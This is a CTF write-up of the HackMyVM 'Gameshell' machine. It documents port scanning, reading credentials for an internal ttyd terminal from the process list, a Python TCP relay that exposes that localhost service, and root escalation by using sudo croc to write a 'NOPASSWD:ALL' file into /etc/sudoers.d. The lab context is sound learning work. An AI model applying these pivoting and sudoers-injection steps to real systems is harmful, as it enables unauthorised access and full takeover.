# 🎮 Gameshell — HackMyVM Writeup
## Introduction

This writeup documents the complete exploitation process of the Gameshell machine from HackMyVM.

The objective of this machine was to perform a full attack chain starting from initial network discovery to full system compromise. The attack required careful enumeration, logical pivoting between services, and exploitation of a misconfigured sudo permission.

Unlike a typical web vulnerability exploitation scenario, this machine focused heavily on:

- Network reconnaissance
- Web service enumeration
- Escaping a restricted shell environment (GameShell)
- Internal service pivoting
- SSH access abuse
- Privilege escalation via sudo misconfiguration (croc binary)

The goal was to obtain:
- User flag
- Root flag

All exploitation steps were performed from a Kali Linux attacker machine inside a VirtualBox lab environment.

## Lab Setup

| Machine    | Role     | Network           |
| ---------- | -------- | ----------------- |
| Kali Linux | Attacker |    YOUR_OWN_IP    |
| Gameshell  | Target   | Host-Only Network |

Both machines were configured using a Host-Only Adapter in VirtualBox to allow direct communication without internet exposure.

---

## Step 1 — Target Discovery

Since this machine was imported locally in VirtualBox, the first step was to discover its IP address on the internal lab network.

I performed a network sweep using arp-scan.

### Command Used
  ```bash
    sudo arp-scan --interface=eth1 192.168.56.0/24
  ```
arp-scan sends ARP requests to all hosts in the specified subnet. ARP works at Layer 2 (Data Link Layer) and detects live hosts even if ICMP (ping) is disabled. It is faster and more reliable in local lab environments.

### Result
The following live host was identified:

  ```bash
    192.168.56.156
  ```
This was assumed to be the Gameshell machine.

---

## Step 2 — Host Verification

To confirm that the machine was reachable, I tested connectivity using ICMP ping.

### Command Used
  ```bash
    ping 192.168.56.156
  ```

This Command Confirms that the host is online and verifies network connectivity and also ensures correct adapter configuration. It also Confirms no firewall blocking ICMP.

### Result

The machine responded successfully to ICMP requests, confirming that:
- The target is alive.
- The network configuration is correct.
- The machine is ready for enumeration.

---

## Step 3 — Full Port Scan & Service Enumeration

After confirming that the target was alive, the next step was to enumerate all open TCP ports and identify running services.

### Command Used
  ```bash
    nmap -sC -sV -p- 192.168.56.156
  ```
The command flags represents: 
- -sC → Runs default Nmap scripts (basic enumeration & detection)
- -sV → Performs version detection
- -p- → Scans all 65535 TCP ports

### Scan Results
  ```bash
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.4p1 Debian
    80/tcp   open  http    Apache httpd 2.4.62 (Debian)
    7681/tcp open  http    ttyd 1.7.7
  ```

### Analysis of Findings
**Port 22 — SSH**
- OpenSSH 8.4p1
- Likely requires credentials
- Not vulnerable by default
- Will revisit later if credentials are found

**Port 80 — Apache Web Server**
- Apache 2.4.62 (Debian)
- Website title:
  ```bash
    Bash // The Eternal Shell
  ```
This is likely the main attack surface.

**Port 7681 — ttyd Web Terminal**
- This is extremely interesting.
- ttyd is a web-based terminal emulator
- It allows shell access through a browser
- Version: 1.7.7
- The HTTP title:
  ```bash
    ttyd - Terminal
  ```
  
### Attack Surface Summary
| Port | Service             | Priority             |
| ---- | ------------------- | -------------------- |
| 22   | SSH                 | Medium (needs creds) |
| 80   | Apache Web          | High                 |
| 7681 | Web Terminal (ttyd) | VERY HIGH            |

The presence of ttyd indicates that this machine likely revolves around shell access and potential breakout techniques.

---

## Step 4 — Web Enumeration

After identifying open ports, I manually visited the exposed web services.

### Port 7681 : ttyd web terminal

When visiting:
  ```bash
    http://192.168.56.156:7681/
  ```

The page displayed an interactive terminal-style interface titled:

**Welcome to GameShell!**

The interface contained instructions such as:
  ```bash
    Run the command:
    $ gsh goal
    
    $ gsh check
    $ gsh help
  ```
It appeared to be a gamified shell environment designed to teach command-line usage.

Then the promp showed :
  ```bash
    [mission 1] $
  ```

This strongly indicates:
- The machine is intentionally exposing a shell interface
- The challenge likely revolves around shell interaction
- This may be a restricted environment

---

## Step 5 — Initial Shell Enumeration (ttyd)

After accessing the ttyd web terminal on port 7681, I began enumerating the environment.

### Checking Current User
  ```bash
    whoami
  ```
- Output:
  ```bash
    www-data
  ```
  
### Checking User Privileges
  ```bash
    id
  ```
- Output:
  ```bash
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
This confirms:
- The shell is running as www-data
- This is the default Apache web server user
- We currently have low-privileged access

### Checking Current Working Directory
  ```bash
    pwd
  ```
- Output:
  ```bash
    /opt/gameshell/gameshell/World
  ```

This indicates that:
- We are inside a custom application directory
- The shell environment is likely part of the GameShell application
- This may be a controlled or sandboxed environment

### Listing Files and Directories
  ```bash
    ls -la
  ```
- Output:
  ```bash
    Castle
    Forest
    Garden
    Mountain
    Stall
  ```

This confirms:
- The environment is structured like a game world
- Directories represent locations
- The challenge likely involves navigating through these directories

---

## Step 6 — Shell Capability Testing

To determine whether the shell was restricted or sandboxed, I tested environment variables and filesystem access.

### Checking Default Shell
  ```bash
    echo $SHELL
  ```
- Output:
  ```bash
    /usr/sbin/nologin
  ```
This indicates that the www-data user is not meant to have interactive login access. However, since access is provided via ttyd, this restriction does not apply.

### Checking PATH Variable
  ```bash
    echo $PATH
  ```
The Observation That I made:
- Custom GameShell script directories are present.
- Standard system binary directories (/bin, /usr/bin, etc.) are also accessible.

This suggests we are not restricted to a custom command wrapper.

### Checking Bash Availability
  ```bash
    which bash
  ```
- Output:
  ```bash
    /usr/bin/bash
  ```
This confirms that the real bash binary is accessible.

### Checking Root Filesystem Access
  ```bash
    ls /
  ```

The full Linux filesystem structure was visible.

This confirms:
- The shell is NOT jailed
- The shell is NOT chrooted
- This is a real system shell running as www-data

---

## Step 7 — Identifying Command Filtering

I attempted to check sudo privileges:
  ```bash
    sudo -l
  ```
- Result:
  ```bash
    gsh: sudo: command not found
  ```
However, during SUID enumeration:
  ```bash
    find / -perm -4000 -type f 2>/dev/null
  ```
The following binary was found:
  ```bash
    /usr/bin/sudo
  ```
This indicates:
- The sudo binary exists on the system.
- However, the gsh wrapper blocks execution of certain commands.
- This confirms we are operating inside a restricted command wrapper.

---

## Step 8 — Attempting Shell Escape

Since the environment appeared to be a restricted wrapper, I attempted to spawn a real shell.

### Attempt 1 — Spawn Bash
  ```bash
    bash
  ```
- Result:

The GameShell interface reloaded and printed the mission instructions again.

This indicates that bash execution is intercepted and redirected back into the game wrapper.

### Attempt 2 — Direct Path Execution
  ```bash
    /bin/bash
  ```
- Result:

The same GameShell banner reappeared.

This confirms that even direct binary invocation is filtered.

### Attempt 3 — Using sh
  ```bash
    sh
  ```
- The prompt changed to:
  ```bash
    [mission ] $
  ```
Then:
  ```bash
    /bin/sh
  ```
- Result:
  ```bash
    /bin/sh: 1: gsh: not found
  ```
### The Key Observation that I made:
- The error:
  ```bash
    gsh: not found
  ```
- Suggests:
  - The environment depends on the gsh program.
  - The shell session is controlled by a wrapper mechanism.
  - The wrapper may rely on environment variables or PATH manipulation.
  - Breaking the wrapper may be possible by altering environment execution behavior.

---

## Step 9 — Inspecting the GameShell Wrapper

After confirming that gsh was not directly callable, I investigated the GameShell script directory.

### Checking for gsh Binary
  ```bash
    which gsh
    type gsh
  ```
- Result:
  ```bash
    gsh: not found
  ```
This indicates that gsh is not a standalone system binary.

### Inspecting Script Directory
  ```bash
    ls -la /opt/gameshell/gameshell/scripts
  ```
The directory contained numerous executable scripts such as:
  ```bash
    _gsh_env
    _gsh_goal
    _gsh_systemconfig
    _gsh_protect
    _gsh_unprotect
    admin_mode
    mainshell.sh
    generate_rcfile
    mktemp
    rm
    copy_bin
  ```
### Key Observation that I made:

The GameShell environment is implemented entirely using shell scripts.

This means:
- Command filtering is likely done in mainshell.sh
- Environment setup is likely done in _gsh_env
- Command validation may be script-based
- If any script is misconfigured, it could allow command execution bypass

---

## Step 10 — Directory Permission Analysis

To determine whether script modification was possible, I inspected directory permissions.

### Checking Script Directory Permissions
  ```bash
    ls -ld /opt/gameshell/gameshell/scripts
  ```
- Output:
  ```bash
    drwxr-xr-x 2 www-data www-data
  ```
This indicates:
- The directory is owned by www-data
- The current user is www-data
- Owner has write permission

Therefore, Script modification inside this directory may be possible.

### Checking Parent Directory Permissions
  ```bash
    ls -ld /opt/gameshell/gameshell
  ```
- Output:
  ```bash
    d--x--x--x
  ```
This indicates:
- No read permission
- No write permission
- Only execute (traversal)

This prevents listing or modifying parent directory contents.

## Step 11 — Writable PATH Directory Discovery

To test write permissions inside the script directory, I attempted to create a file:
  ```bash
    touch /opt/gameshell/gameshell/scripts/testfile
  ```
The file was successfully created:
  ```bash
    -rw-r--r-- 1 www-data www-data testfile
  ```
This confirms:
- The current user (www-data) can write inside /opt/gameshell/gameshell/scripts
- This directory appears first in the $PATH
- Any executable placed here may override system binaries

### Critical Observation that I made:

Since the script directory appears first in $PATH, this introduces a potential PATH hijacking vulnerability.

If the GameShell wrapper internally executes system commands without absolute paths, a malicious binary placed in this directory could be executed instead.

---

## Step 12 — Process Enumeration

To understand how the GameShell environment was launched, I inspected running processes.
  ```bash
    ps -ef | grep sh
  ```
### Critical Discovery
  ```bash
    www-data  356  1  /usr/local/bin/ttyd -W /opt/gameshell/gameshell.sh
  ```
- This reveals:
  ```bash
    ttyd is launching /opt/gameshell/gameshell.sh
  ```
This script is the actual GameShell wrapper

### Secondary ttyd Instance
  ```bash
    eviden 360 1 /usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash
  ```
This is extremely important:
- Another ttyd service is running
- Bound to localhost only (127.0.0.1)
- Port 9876
- Credentials: admin:nimda
- Launching a full bash shell
- Running as user: eviden

### Analysis of the entire output that we got:

- There is an internal admin terminal.
- It is not accessible externally.
- It requires local access.
- If we can access 127.0.0.1:9876 from this machine, we may gain a shell as eviden.
- This shifts the attack path from wrapper escape to internal service pivoting.

---

## Step 13 — Internal Service Pivot Discovery

During process enumeration, a second ttyd instance was discovered:
  ```bash
    ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash
  ```
### Key findings:
- Service bound to localhost only
- Port 9876
- Basic authentication credentials: admin:nimda
- Launches full bash
- Running as user: eviden

This indicates an internal administrative terminal not exposed externally.

---

## Step 14 — Internal Service Pivot to User eviden

During process enumeration, the following service was identified:
  ```bash
    eviden 360 1 /usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash
  ```
### Key Findings that I found:
- Bound to 127.0.0.1 (localhost only)
- Port: 9876
- Basic authentication: admin:nimda
- Launches: bash
- Running as user: eviden

This indicates an internal administrative terminal not exposed externally.

### Confirming Internal Connectivity

From the www-data shell, connectivity to the internal service was confirmed:
  ```bash
    bash -c 'exec 3<>/dev/tcp/127.0.0.1/9876'
  ```
The connection successfully established (hung), confirming the service was reachable locally.

### Exposing the Internal Service

Since the service was bound to localhost, a Python-based TCP relay was created to expose it externally:
  ```bash
    python3 - << 'EOF'
    import socket,threading
    
    def forward(src, dst):
        while True:
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    
    listener = socket.socket()
    listener.bind(("0.0.0.0", 9001))
    listener.listen(1)
    
    while True:
        client, addr = listener.accept()
        target = socket.socket()
        target.connect(("127.0.0.1", 9876))
        threading.Thread(target=forward, args=(client, target)).start()
        threading.Thread(target=forward, args=(target, client)).start()
    EOF
```

This forwarded:
  ```bash
    0.0.0.0:9001 → 127.0.0.1:9876
  ```
 
### Accessing the Admin Terminal

Now From Kali browser:
  ```bash
    http://192.168.56.156:9001
  ```
Authentication credentials:
  ```bash
    admin
    nimda
  ```
This successfully provided a full interactive bash shell as:
  ```bash
    eviden
  ```

The internal ttyd service was protected only by basic auth and it was not exposed externally. However, local shell access allowed internal pivoting and the Python relay bypassed network binding restrictions hence, the service directly launched a full bash shell.

### Current Privilege Level
  ```bash
    whoami
  ```
Output:
  ```bash
    eviden
  ```
User access successfully obtained.

---

## Step 15 — Sudo Privilege Enumeration (User: eviden)
  ```bash
    id
  ```
- Output
  ```bash
    uid=1001(eviden) gid=1001(eviden) groups=1001(eviden)
  ```
This confirms successful lateral movement from www-data to eviden.

### Checking Sudo Permissions
  ```bash
    sudo -l
  ```
- Output
  ```bash
    User eviden may run the following commands on GameShell:
        (ALL) NOPASSWD: /usr/local/bin/croc
  ```
  
### Analyze the finding

This is a critical finding as the user eviden can execute:
  ```bash
    /usr/local/bin/croc
  ```
As any user (including root)
Without requiring a password.

This introduces a strong privilege escalation vector.

---

## Step 16 — Investigating croc
To understand how croc could be abused, I inspected the binary.
### File Information
  ```bash
    file /usr/local/bin/croc
  ```
- Output:
  ```bash
    ELF 64-bit LSB executable, statically linked, not stripped
  ```
- This confirms:
  - It is a compiled binary
  - Not a script
  - Contains debug info
  - Likely fully functional

### Help Menu
  ```bash
    /usr/local/bin/croc --help
  ```
- The help output revealed:
  - croc send — send files
  - croc **<code>** — receive files
  - Supports custom output directory (--out)
  - Supports overwrite
  - Supports stdout redirection

### Key Observation that I made:
- croc is a file transfer utility.
- If executed with:
  ```bash
    sudo croc
  ```
It runs as root.

This means:
- Files received by croc will be written as root.
- It can write to privileged directories.
- It can potentially overwrite sensitive files.
- This opens multiple privilege escalation paths:
- Write to /root/.ssh/authorized_keys
- Drop SUID binaries
- Modify /etc/sudoers
- Write reverse shell scripts

---

## Step 17 — Preparing Root SSH Key Injection
To escalate privileges cleanly, I generated an SSH key pair on Kali:
  ```bash
    ssh-keygen -t rsa -f gameshell_root -N ""
  ```
This created:
  ```bash
    gameshell_root (private key)
    gameshell_root.pub (public key)
  ```

The objective is to transfer the public key into:
  ```bash
    /root/.ssh/authorized_keys
  ```
Using the privileged croc binary.
Since croc runs as root when executed with sudo, any received file can be written with root privileges.

---

## Step 18 — Re-evaluating the Croc Sudo Misconfiguration
After gaining access as eviden, I ran:
  ```bash
    sudo -l
  ```
- Output:
  ```bash
    (ALL) NOPASSWD: /usr/local/bin/croc
  ```
This confirmed:
- I could run croc as root
- No password required
- No other sudo privileges available initially

At this stage:
- Internet access was blocked
- PATH manipulation was blocked (secure_path)
- Environment injection was blocked (env_reset)
- Therefore, the escalation had to be purely local.

---

## Step 19 — Understanding Croc Capabilities
From:
  ```bash
    /usr/local/bin/croc --help
  ```
### Key observations:
- croc relay → start local relay server
- croc send → send files
- --out → write received files to specific directory
- --overwrite → overwrite existing files

Since croc runs as root via sudo, any file written using --out would be written as root.
This is the core vulnerability.

---

## Step 20 — Starting a Local Croc Relay (Root)
Because outbound internet was blocked, the public croc relay could not be used.
Instead, I started a local relay server:
  ```bash
    sudo croc relay
  ```
- Output:
  ```bash
    starting croc relay version v10.2.7
    starting TCP server on :9009
    starting TCP server on :9010
    ...
  ```
This allowed file transfers entirely inside the machine.

---

## Step 21 — Creating a Malicious Sudoers File
To escalate privileges, I created a file granting full sudo rights:
  ```bash
    echo "eviden ALL=(ALL) NOPASSWD:ALL" > /tmp/rootme
  ```
This file contained:
- eviden ALL=(ALL) NOPASSWD:ALL

---

## Step 22 — Writing Into /etc/sudoers.d as Root
In another terminal, I ran croc as root in receive mode:
  ```bash
    sudo croc --relay 127.0.0.1:9009 --overwrite --out /etc/sudoers.d
  ```
It prompted:
  ```bash
    Enter receive code:
  ```
In a separate shell, I sent the file:
  ```bash
    sudo croc --relay 127.0.0.1:9009 send /tmp/rootme
  ```
After entering the generated code, croc wrote:
  ```bash
    /etc/sudoers.d/rootme
  ```
Owned by root.

Transfer confirmation:
  ```bash
    Receiving (<-127.0.0.1:46136)
     rootme 100% |████████████████████| (30/30 B)
  ```

---

## Step 23 — Confirming Privilege Escalation
I rechecked sudo privileges:
  ```bash
    sudo -l
  ```
Output now showed:
  ```bash
    (ALL) NOPASSWD: ALL
  ```
Full sudo access was successfully granted.

---

## Step 24 — Root Access Achieved
I escalated to root:
  ```bash
    sudo su
  ```
Confirmed:
  ```bash
    whoami
  ```
Output:
  ```bash
    root
  ```
Then retrieved the root flag:
  ```bash
    cd ~
    cat root.txt
  ```

---

## Step 25 — Get User and Root Flags
Now lets move to root directory and cat the root.txt and then move to /home/silo directory and cat the user.txt 
The flags are:
  ```bash
    flag{root-REDACTED}
    flag{user-REDACTED}
  ```
## Conclusion
### Summary of the Attack Chain
This machine demonstrated a complete attack path from initial access to full system compromise.

### Phase 1 — Initial Access
- Discovered the target via arp-scan
- Identified open services using nmap
- Enumerated the web service and discovered a web-based terminal (ttyd)
- Escaped the restricted GameShell environment
- Pivoted locally to access the internal admin ttyd service
- Gained access as the user eviden

### Phase 2 — Privilege Escalation
- Enumerated sudo permissions using:
  ```bash
    sudo -l
  ```
- Discovered that croc could be executed as root without a password
- Analyzed croc functionality and identified file-write capability
- Used croc to write a malicious sudoers configuration into /etc/sudoers.d
- Granted eviden full sudo privileges
- Escalated to root using:
  ```bash
    sudo su
  ```
  
### Phase 3 — Flag Retrieval
- Retrieved user flag
- Retrieved root flag

### Key Takeaways that should be clear after successful solving of the machine
- Web-based terminals can expose internal services.
- Local-only services can still be abused through pivoting.
- Misconfigured sudo permissions are extremely dangerous.
- File transfer tools running as root can become privilege escalation vectors.
- Enumeration and patience are more powerful than brute force.

### What This Machine Taught Me (My Personal Review and Learning)
- Always enumerate thoroughly before exploiting.
- If something “hangs,” it may mean it’s working.
- When internet access is blocked, think locally.
- Never assume standard CTF structure — verify.

## Final Thoughts
This machine required logical thinking, controlled pivoting, and careful analysis of sudo misconfigurations. The exploitation was not based on a vulnerability in software, but rather on a misconfiguration — which reflects real-world security issues.

Overall it was a very practical and educational machine.
